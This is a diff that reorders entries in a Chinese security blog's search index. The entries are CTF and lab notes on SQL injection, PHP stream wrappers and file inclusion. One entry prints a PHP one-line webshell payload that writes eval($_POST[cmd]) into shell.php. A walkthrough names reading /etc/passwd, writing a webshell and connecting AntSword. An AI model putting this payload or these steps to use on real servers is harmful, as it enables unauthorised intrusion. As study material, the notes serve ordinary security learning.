@@ -821,6 +821,42 @@
       </tags>
   </entry>
   <entry>
+    <title>(load_file&amp;into outfile)云演sql注入基础</title>
+    <url>/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807114141-123d5599-d2ce-4598-afc6-018fd82e76ef.png" alt="img"></p>
+<span id="more"></span>
+
+<p>随便点开一则新闻</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807149490-ec21617b-5012-4f5d-8185-b3cebdc9de04.png" alt="img"></p>
+<p>可以看到有注入点</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807180920-7132a4c1-c9b2-4553-ad4a-0acaf13c396e.png" alt="img"></p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807192065-afb86caa-acdd-403d-bc31-8bdad668664b.png" alt="img"></p>
+<p>使用and 1=1成功回显 和 and 1=2不回显 判断是整形注入</p>
+<p>1.开始查字段</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807279567-51c0a74b-cf9a-4def-bb6d-8a9f8af5e102.png" alt="img"></p>
+<p>2.报错出注入点</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807338156-2120348b-2be0-4c80-a780-2dea2fcd734c.png" alt="img"></p>
+<p>3.查看数据库</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807361859-56b1ba95-be6d-4980-a27b-f3595f294f1a.png" alt="img"></p>
+<p>4.读取linux的/etc/passwd文件</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807410488-5ea7c532-bd44-422a-bbc6-c1f1b8c28f52.png" alt="img"></p>
+<p>5.写🐎</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807460252-e58b1073-e0f4-4c91-b98d-6ef4b09546fb.png" alt="img"></p>
+<p>6.查看是否写入</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807485861-c41aa6bc-0ae0-4a80-ab01-62d3f0ae8bcb.png" alt="img"></p>
+<p>7.连接蚁剑</p>
+<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807527965-3a6b9d9a-0652-47e1-9221-b4d2aea9124a.png" alt="img"></p>
+<p>8.拿flag</p>
+<p>flag{b4dd36207eb58098c458fe9d9498727b}</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>mp3stego怎么用</title>
     <url>/2023/01/07/mp3stego%E6%80%8E%E4%B9%88%E7%94%A8/</url>
     <content><![CDATA[<ul>
@@ -856,42 +892,6 @@
       </categories>
       <tags>
         <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>(load_file&amp;into outfile)云演sql注入基础</title>
-    <url>/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807114141-123d5599-d2ce-4598-afc6-018fd82e76ef.png" alt="img"></p>
-<span id="more"></span>
-
-<p>随便点开一则新闻</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807149490-ec21617b-5012-4f5d-8185-b3cebdc9de04.png" alt="img"></p>
-<p>可以看到有注入点</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807180920-7132a4c1-c9b2-4553-ad4a-0acaf13c396e.png" alt="img"></p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807192065-afb86caa-acdd-403d-bc31-8bdad668664b.png" alt="img"></p>
-<p>使用and 1=1成功回显 和 and 1=2不回显 判断是整形注入</p>
-<p>1.开始查字段</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807279567-51c0a74b-cf9a-4def-bb6d-8a9f8af5e102.png" alt="img"></p>
-<p>2.报错出注入点</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807338156-2120348b-2be0-4c80-a780-2dea2fcd734c.png" alt="img"></p>
-<p>3.查看数据库</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807361859-56b1ba95-be6d-4980-a27b-f3595f294f1a.png" alt="img"></p>
-<p>4.读取linux的/etc/passwd文件</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807410488-5ea7c532-bd44-422a-bbc6-c1f1b8c28f52.png" alt="img"></p>
-<p>5.写🐎</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807460252-e58b1073-e0f4-4c91-b98d-6ef4b09546fb.png" alt="img"></p>
-<p>6.查看是否写入</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807485861-c41aa6bc-0ae0-4a80-ab01-62d3f0ae8bcb.png" alt="img"></p>
-<p>7.连接蚁剑</p>
-<p><img src="/2023/01/07/load-file-into-outfile-%E4%BA%91%E6%BC%94sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/1672807527965-3a6b9d9a-0652-47e1-9221-b4d2aea9124a.png" alt="img"></p>
-<p>8.拿flag</p>
-<p>flag{b4dd36207eb58098c458fe9d9498727b}</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1037,6 +1037,30 @@
       </tags>
   </entry>
   <entry>
+    <title>php伪协议</title>
+    <url>/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1671075085334-f8db25b9-a34c-4389-bcc8-456136aa10b3.png" alt="img"></p>
+<span id="more"></span>
+
+<p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">https://www.cnblogs.com/zzjdbk/p/13030717.html</a></p>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。<br>用法：?file=php://input 数据利用POST传过去</p>
+<h2 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h2><p>碰到file_get_contents()就要想到用php://input绕过，因为php伪 也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<p>通过input获取webshell<br>写入一句话木马<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>‘);?&gt;</p>
+<p>这句话的意思就是把<?php @eval($_POST[cmd])?> 写入shell.php文件内</p>
+<h2 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985517502-8a69e911-3940-44ac-ba57-3d9da4d9357c.png" alt="img"></p>
+<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985533813-9ec7942b-c948-4f4e-95a2-9d88077040a1.png" alt="img"></p>
+<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985642874-68dc50ef-5eaa-41c1-b524-521e956fa458.png" alt="img"></p>
+<h2 id="zip伪协议"><a href="#zip伪协议" class="headerlink" title="zip伪协议"></a>zip伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985545426-183eb807-c399-45f5-9f46-a970ba1aa748.png" alt="img"></p>
+<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985621872-439b3aed-aa5b-4b67-a199-a1d3e95c3f4d.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(php伪协议/反序列化)[ZJCTF 2019]NiZhuanSiWei</title>
     <url>/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ZJCTF-2019-NiZhuanSiWei/</url>
     <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;&lt;</span><br></pre></td></tr></table></figure>
@@ -1071,30 +1095,6 @@
 ]]></content>
       <categories>
         <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php伪协议</title>
-    <url>/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1671075085334-f8db25b9-a34c-4389-bcc8-456136aa10b3.png" alt="img"></p>
-<span id="more"></span>
-
-<p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">https://www.cnblogs.com/zzjdbk/p/13030717.html</a></p>
-<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。<br>用法：?file=php://input 数据利用POST传过去</p>
-<h2 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h2><p>碰到file_get_contents()就要想到用php://input绕过，因为php伪 也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
-<p>通过input获取webshell<br>写入一句话木马<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>‘);?&gt;</p>
-<p>这句话的意思就是把<?php @eval($_POST[cmd])?> 写入shell.php文件内</p>
-<h2 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985517502-8a69e911-3940-44ac-ba57-3d9da4d9357c.png" alt="img"></p>
-<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985533813-9ec7942b-c948-4f4e-95a2-9d88077040a1.png" alt="img"></p>
-<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985642874-68dc50ef-5eaa-41c1-b524-521e956fa458.png" alt="img"></p>
-<h2 id="zip伪协议"><a href="#zip伪协议" class="headerlink" title="zip伪协议"></a>zip伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985545426-183eb807-c399-45f5-9f46-a970ba1aa748.png" alt="img"></p>
-<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985621872-439b3aed-aa5b-4b67-a199-a1d3e95c3f4d.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -1784,28 +1784,6 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
-    <title>文件包含常用函数</title>
-    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<p>include()</p>
-<p>require()</p>
-<p>fopen()</p>
-<p>include_once()</p>
-<p>require_once()</p>
-<p>readfile()</p>
-<span id="more"></span>
-
-<h2 id="include-与require-区别"><a href="#include-与require-区别" class="headerlink" title="include()与require()区别"></a>include()与require()区别</h2><p>当包含一个不存在的文件时，include会报错，但是下面的语句正常执行，而require就会报错并停止脚步继续执行。</p>
-<h2 id="include-once-与require-once-区别"><a href="#include-once-与require-once-区别" class="headerlink" title="include_once()与require_once()区别"></a>include_once()与require_once()区别</h2><p>当之前包含过一个文件时，就不会再包含了</p>
-<h2 id="fopen-与readfile"><a href="#fopen-与readfile" class="headerlink" title="fopen()与readfile()"></a>fopen()与readfile()</h2><p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/1672882660228-68caa210-f9c8-4e8a-bf9b-faa0ea17a1ee.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>本地文件包含与远程文件包含</title>
     <url>/2023/01/07/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<h2 id="1-本地文件包含漏洞"><a href="#1-本地文件包含漏洞" class="headerlink" title="1.本地文件包含漏洞"></a>1.本地文件包含漏洞</h2><p>  本地文件包含（LFI）漏洞是PHP中一种典型的高危漏洞。由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web服务器将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p>
@@ -1820,6 +1798,28 @@ include('files/'.$action.'.php'); //载入相应文件
 <p>(3）被包含的变量前没有目录的限制</p>
 <h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><p>(1）远程包含文件路径必须为绝对路径</p>
 <p>(2）被包含的文件不能够被服务器解析，如php文件</p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含常用函数</title>
+    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<p>include()</p>
+<p>require()</p>
+<p>fopen()</p>
+<p>include_once()</p>
+<p>require_once()</p>
+<p>readfile()</p>
+<span id="more"></span>
+
+<h2 id="include-与require-区别"><a href="#include-与require-区别" class="headerlink" title="include()与require()区别"></a>include()与require()区别</h2><p>当包含一个不存在的文件时，include会报错，但是下面的语句正常执行，而require就会报错并停止脚步继续执行。</p>
+<h2 id="include-once-与require-once-区别"><a href="#include-once-与require-once-区别" class="headerlink" title="include_once()与require_once()区别"></a>include_once()与require_once()区别</h2><p>当之前包含过一个文件时，就不会再包含了</p>
+<h2 id="fopen-与readfile"><a href="#fopen-与readfile" class="headerlink" title="fopen()与readfile()"></a>fopen()与readfile()</h2><p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/1672882660228-68caa210-f9c8-4e8a-bf9b-faa0ea17a1ee.png" alt="img"></p>
 ]]></content>
       <categories>
         <category>文件包含</category>
@@ -2139,29 +2139,6 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
-    <title>网安基础总结三</title>
-    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
-    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
-<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
-<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
-<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
-<span id="more"></span>
-
-<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
-<p>然后输入命令</p>
-<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
-<p>如</p>
-<p>certutil -hashfile  webpro.war MD5</p>
-<p>注意后面有个MD5,不然会生成一个其他的值。</p>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网安基础总结二</title>
     <url>/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/</url>
     <content><![CDATA[<p><strong>本周重点</strong></p>
@@ -2285,6 +2262,29 @@ include('files/'.$action.'.php'); //载入相应文件
 <ul>
 <li><strong>注：平常安装的burp suite只能抓取   http://   不能抓取   https://</strong></li>
 </ul>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安基础总结三</title>
+    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
+    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
+<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
+<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
+<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
+<span id="more"></span>
+
+<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
+<p>然后输入命令</p>
+<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
+<p>如</p>
+<p>certutil -hashfile  webpro.war MD5</p>
+<p>注意后面有个MD5,不然会生成一个其他的值。</p>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
